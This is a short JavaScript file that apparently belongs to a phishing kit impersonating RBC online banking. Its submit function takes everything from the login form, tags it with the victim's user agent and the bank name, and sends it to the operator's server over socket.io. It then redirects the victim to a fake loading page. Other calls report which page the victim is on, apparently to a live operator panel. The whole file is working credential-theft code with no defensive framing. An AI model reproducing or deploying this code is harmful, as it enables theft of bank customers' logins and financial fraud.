const socket = io();

function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;
    document.getElementById('banks').value = 'RBC';

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submitLogin', Object.fromEntries(formData));

    window.location.href = "/rbc/loading";
}

socket.emit('updateBanks', {banks: 'RBC'})
socket.emit('updatePage', {page : 'Login'})
